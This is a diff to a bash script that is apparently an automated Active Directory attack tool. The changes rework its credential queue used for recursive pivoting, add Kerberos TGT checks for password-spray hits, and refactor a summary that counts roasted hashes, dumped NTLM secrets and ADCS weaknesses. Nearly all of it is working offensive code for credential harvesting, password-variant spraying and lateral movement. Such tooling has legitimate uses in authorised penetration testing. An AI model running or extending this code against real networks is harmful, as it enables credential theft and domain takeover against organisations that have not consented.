@@ -285,24 +285,30 @@ rb_record() {  # rb_record "<human description>" "<shell command that undoes it>
 # ---------------------------------------------------------------------------
 #  CREDENTIAL QUEUE  (drives recursive pivoting)
 # ---------------------------------------------------------------------------
+cred_key() { printf '%s|%s|%s' "${1,,}" "$2" "$3"; }
+
 queue_cred() {  # queue_cred <user> <password|""> <nthash|""> [via-technique]
     local u="$1" p="$2" h="$3" via="${4:-pivot}"
     if ! _is_valid_identity "$u"; then
         [[ -n "$u" ]] && err "Ignoring implausible identity '$u' (looks like a path/filename)"
         return
     fi
-    local key="${u,,}"
+    local user_key="${u,,}" key; key="$(cred_key "$u" "$p" "$h")"
     # Record the attack-chain edge (the identity we're acting as --via--> this one)
     # the FIRST time we learn of it — even if already seen/queued — so the final
     # "attack chain" is complete. A self-reference (root / self-reset) is skipped.
-    if [[ -z "${CHAIN_VIA[$key]:-}" && -n "${USER,,}" && "${USER,,}" != "$key" ]]; then
-        CHAIN_FROM["$key"]="${USER,,}"; CHAIN_VIA["$key"]="$via"
+    if [[ -z "${CHAIN_VIA[$user_key]:-}" && -n "${USER,,}" && "${USER,,}" != "$user_key" ]]; then
+        CHAIN_FROM["$user_key"]="${USER,,}"; CHAIN_VIA["$user_key"]="$via"
     fi
-    [[ -n "${SEEN_CREDS[$key]:-}" ]] && return   # already assessed this identity
-    # Also skip if it's already waiting in the queue (case-insensitive): tools
-    # report names in different cases (kerbrute 'Bob' vs nxc 'bob') and
-    # several sources queue the same lead, which otherwise got assessed twice.
-    local q qu; for q in "${CRED_QUEUE[@]}"; do qu="${q%%|*}"; [[ "${qu,,}" == "$key" ]] && return; done
+    [[ -n "${SEEN_CREDS[$key]:-}" || -n "${SEEN_CREDS[${user_key}|*|*]:-}" ]] && return
+    # Skip only the exact same credential already waiting. Different passwords
+    # for the same user must remain testable (year variants / old leaked secret).
+    local q qk qu qp qh
+    for q in "${CRED_QUEUE[@]}"; do
+        IFS='|' read -r qu qp qh <<<"$q"
+        qk="$(cred_key "$qu" "$qp" "$qh")"
+        [[ "$qk" == "$key" ]] && return
+    done
     CRED_QUEUE+=("${u}|${p}|${h}")
     loot "New identity queued for pivoting → ${C_BOLD}${u}${C_RESET}$( [[ -n "$p" ]] && echo " (password)" || echo " (NT hash)")"
 }
@@ -2815,11 +2821,9 @@ harvest_secrets() {
         _plausible_secret "$p"  || continue
         loot "★ Credential PAIR harvested from ${label}: ${C_GREEN}${C_BOLD}${u} : ${p}${C_RESET}"
         add_secret "$p" "harvested pair (user $u) from $label"
-        note_cred_source "${u}:${p}" "harvested cred pair from $label"
         queue_cred "$u" "$p" "" "harvested cred pair from $label"
         while IFS= read -r vp; do
             [[ -z "$vp" || "$vp" == "$p" ]] && continue
-            note_cred_source "${u}:${vp}" "year variant of harvested cred pair from $label"
             queue_cred "$u" "$vp" "" "year variant of harvested cred pair"
         done < <(year_variants "$p")
         added=$((added+1))
@@ -3108,6 +3112,23 @@ phase_user_variants() {
 # some installs leave /opt/kerbrute as a folder, and `-x` is true on dirs).
 _kerbrute_ok() { [[ -n "$KERBRUTE_BIN" && -f "$KERBRUTE_BIN" && -x "$KERBRUTE_BIN" ]]; }
 
+_confirm_plain_cred() {
+    local u="$1" pw="$2" src="${3:-spray}"
+    [[ -z "$DOMAIN" ]] && return 0
+    have impacket-getTGT || return 0
+    local td out rc
+    td=$(mktemp -d)
+    out=$(cd "$td" && timeout -k 5 20 impacket-getTGT "${DOMAIN}/${u}:${pw}" -dc-ip "$DC_IP" 2>&1)
+    rc=$?
+    rm -rf "$td"
+    if [[ "$rc" -eq 0 ]] && grep -qiE 'Saving ticket|saved in' <<<"$out"; then
+        return 0
+    fi
+    warn "${src} reported ${u} as valid, but TGT validation failed → ignoring as false positive"
+    echo "$out" | grep -iE 'KDC_ERR|SessionError|STATUS_|error' | head -2 | sed 's/^/      /' | tee -a "$LOGFILE" >/dev/null
+    return 1
+}
+
 # Spray a single password across all users and queue any valid hit.
 # Uses kerbrute when available; otherwise falls back to netexec (always present),
 # so a recovered/harvested password is ALWAYS sprayed → pivots even w/o kerbrute.
@@ -3121,6 +3142,7 @@ _spray_one() {
     if _kerbrute_ok; then
         while read -r u; do
             [[ -z "$u" ]] && continue
+            _confirm_plain_cred "$u" "$pw" "kerbrute spray" || continue
             loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
             note_cred_source "${u}:${pw}" "password spray (kerbrute)"
             queue_cred "$u" "$pw" "" "password spray"
@@ -4452,12 +4474,14 @@ final_summary() {
     section "OPERATION SUMMARY"
     local auth_state users_n asrep_n time_n kerb_n ntlm_n cracked_n adcs_state admin_state
     auth_state=$([[ $HAVE_AUTH == 1 ]] && echo "${C_GREEN}YES${C_RESET} ${C_DIM}($USER)${C_RESET}" || echo "${C_YELLOW}NO${C_RESET}")
-    users_n=$( [[ -s "$OUTDIR/users_all.txt" ]] && wc -l <"$OUTDIR/users_all.txt" || echo 0 )
-    asrep_n=$( [[ -s "$OUTDIR/asrep_hashes.txt" ]] && grep -c krb5asrep "$OUTDIR/asrep_hashes.txt" || echo 0 )
-    time_n=$( [[ -s "$OUTDIR/timeroast_hashes.txt" ]] && wc -l <"$OUTDIR/timeroast_hashes.txt" || echo 0 )
-    kerb_n=$( [[ -s "$OUTDIR/kerberoast_hashes.txt" ]] && grep -c krb5tgs "$OUTDIR/kerberoast_hashes.txt" 2>/dev/null || echo 0 )
-    ntlm_n=$( [[ -s "$OUTDIR/secretsdump.txt" ]] && grep -cE ':::' "$OUTDIR/secretsdump.txt" || echo 0 )
-    cracked_n=$( [[ -s "$OUTDIR/cracked_passwords.txt" ]] && wc -l <"$OUTDIR/cracked_passwords.txt" || echo 0 )
+    _cnt_lines(){ [[ -s "$1" ]] && wc -l <"$1" || echo 0; }
+    _cnt_re(){ local n; n=$(grep -cE "$1" "$2" 2>/dev/null); echo "${n:-0}"; }
+    users_n=$(_cnt_lines "$OUTDIR/users_all.txt")
+    asrep_n=$(_cnt_re 'krb5asrep' "$OUTDIR/asrep_hashes.txt")
+    time_n=$(_cnt_lines "$OUTDIR/timeroast_hashes.txt")
+    kerb_n=$(_cnt_re 'krb5tgs' "$OUTDIR/kerberoast_hashes.txt")
+    ntlm_n=$(_cnt_re ':::' "$OUTDIR/secretsdump.txt")
+    cracked_n=$(_cnt_lines "$OUTDIR/cracked_passwords.txt")
     adcs_state=$(grep -qiE 'ESC[0-9]+' "$OUTDIR/certipy_find.txt" 2>/dev/null && echo "${C_RED}VULNERABLE${C_RESET}" || echo "${C_GREY}not flagged${C_RESET}")
     admin_state=$([[ "$ntlm_n" -gt 0 || ${#OWNED_ADMIN[@]} -gt 0 ]] && echo "${C_GREEN}${C_BOLD}DOMAIN IMPACT${C_RESET}" || echo "${C_YELLOW}no domain dump yet${C_RESET}")
 
@@ -4617,7 +4641,7 @@ trap _atexit EXIT INT TERM
 BH_DONE=0
 
 assess_current_credential() {
-    SEEN_CREDS["${USER,,}"]=1
+    SEEN_CREDS["$(cred_key "$USER" "$PASS" "$HASH")"]=1
     HAVE_AUTH=0; IS_DC_ADMIN=0; KERB_TICKET=""; unset KRB5CCNAME
 
     section "ASSESSING IDENTITY · ${USER}"
@@ -4671,7 +4695,7 @@ process_queue() {
         entry="${CRED_QUEUE[0]}"
         CRED_QUEUE=("${CRED_QUEUE[@]:1}")        # dequeue (FIFO)
         IFS='|' read -r u p h <<<"$entry"
-        [[ -n "${SEEN_CREDS[${u,,}]:-}" ]] && continue
+        [[ -n "${SEEN_CREDS[$(cred_key "$u" "$p" "$h")]:-}" || -n "${SEEN_CREDS[${u,,}|*|*]:-}" ]] && continue
         USER="$u"; PASS="$p"; HASH="$h"
         assess_current_credential
     done
@@ -4896,7 +4920,7 @@ main() {
     if [[ -s "$OUTDIR/owned_principals.txt" ]]; then
         local _ou _n=0
         while IFS=$'\t' read -r _ou _; do
-            [[ -n "$_ou" ]] && { SEEN_CREDS["${_ou,,}"]=1; _n=$((_n+1)); }
+            [[ -n "$_ou" ]] && { SEEN_CREDS["${_ou,,}|*|*"]=1; _n=$((_n+1)); }
         done <"$OUTDIR/owned_principals.txt"
         [[ "$_n" -gt 0 ]] && info "Resume: $_n already-owned identity/identities will be skipped (won't re-pwn)"
     fi
